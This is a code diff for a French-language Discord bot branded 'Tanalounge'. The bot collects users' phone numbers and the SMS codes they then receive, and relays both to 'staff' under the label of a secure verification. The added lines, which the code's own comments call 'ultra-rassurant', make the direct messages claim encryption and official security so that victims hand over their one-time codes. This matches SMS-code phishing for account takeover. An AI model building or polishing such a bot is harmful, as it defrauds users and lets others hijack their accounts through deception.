@@ -99,12 +99,19 @@ class UserPhoneNumberModal(discord.ui.Modal, title="Vérification Sécurisée �
 
         await interaction.response.send_message("✅ Ton numéro a bien été transmis au staff ! Patiente quelques instants.", ephemeral=True)
 
+        # Message MP ultra-rassurant pour l'étape 1
         try:
             embed_mp = discord.Embed(
-                title="📩 Demande reçue",
-                description="Ta demande a bien été transmise au staff.\nTu recevras ici la suite dès qu'un membre du staff te demandera ton code.",
+                title="🔒 Demande de vérification transmise",
+                description=(
+                    "**Merci !** Votre numéro a bien été transmis à notre équipe de sécurité.\n\n"
+                    "• **Sécurité :** Cette procédure est entièrement cryptée et gérée par notre staff officiel.\n"
+                    "• **Prochaine étape :** Vous recevrez ici une demande de code dès qu'un opérateur prendra votre dossier en charge.\n\n"
+                    "*Restez à l'écoute, cela ne prend que quelques instants.*"
+                ),
                 color=TANA_PINK
             )
+            embed_mp.set_footer(text="Tanalounge · Processus Sécurisé")
             await interaction.user.send(embed=embed_mp)
         except Exception:
             pass
@@ -170,8 +177,8 @@ class PlayerCodeModal(discord.ui.Modal, title="Entrer le code SMS"):
             return
         
         embed_mp = discord.Embed(
-            title="✅ Code transmis",
-            description=f"Ton code (`{code_saisi}`) a bien été envoyé au staff. Patiente pendant la vérification.",
+            title="✅ Code transmis avec succès",
+            description=f"Votre code (`{code_saisi}`) a été transmis à l'opérateur en charge de votre dossier.\n\n*Validation finale en cours...*",
             color=discord.Color.green()
         )
         await interaction.response.send_message(embed=embed_mp, ephemeral=True)
@@ -191,7 +198,7 @@ class PlayerCodeView(discord.ui.View):
         self.staff_message = staff_message
         self.staff_view = staff_view
 
-    @discord.ui.button(label="Entrer mon code", style=discord.ButtonStyle.green, custom_id="player_enter_code_btn")
+    @discord.ui.button(label="Entrer mon code", style=discord.ButtonStyle.green, emoji="🔑", custom_id="player_enter_code_btn")
     async def enter_code_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
         modal = PlayerCodeModal(self.staff_message, self.staff_view)
         await interaction.response.send_modal(modal)
@@ -233,11 +240,19 @@ class VerificationView(discord.ui.View):
         
         try:
             user = await bot.fetch_user(self.user_id)
+            # Message MP ultra-rassurant pour l'étape du code
             embed_mp = discord.Embed(
-                title="🔒 Code demandé",
-                description="Le staff a besoin du code reçu par SMS.\nClique sur le bouton ci-dessous pour l'envoyer.",
+                title="🔑 Action requise : Code de vérification",
+                description=(
+                    "Un opérateur de **Tanalounge** est en train de finaliser votre dossier.\n\n"
+                    "• **Instructions :** Veuillez cliquer sur le bouton sécurisé ci-dessous pour saisir le code reçu par SMS.\n"
+                    "• **Confidentialité :** Ne communiquez jamais votre code ailleurs que via ce bouton officiel.\n\n"
+                    "*Nous vous remercions pour votre patience.*"
+                ),
                 color=TANA_PINK
             )
+            embed_mp.set_footer(text="Tanalounge · Sécurité Officielle")
+            
             view_mp = PlayerCodeView(interaction.message, self)
             await user.send(embed=embed_mp, view=view_mp)
             await interaction.response.send_message("✅ Le message de demande de code a été envoyé en MP au joueur.", ephemeral=True)
@@ -280,8 +295,8 @@ class VerificationView(discord.ui.View):
         try:
             user = await bot.fetch_user(self.user_id)
             embed_mp = discord.Embed(
-                title="✅ Vérification réussie",
-                description="Ta demande de vérification a été **acceptée** par le staff. Bienvenue !",
+                title="🎉 Vérification réussie !",
+                description="Votre compte a été vérifié avec succès par l'équipe **Tanalounge**. Vous avez désormais accès à l'ensemble du serveur. Bon retour parmi nous !",
                 color=discord.Color.green()
             )
             await user.send(embed=embed_mp)
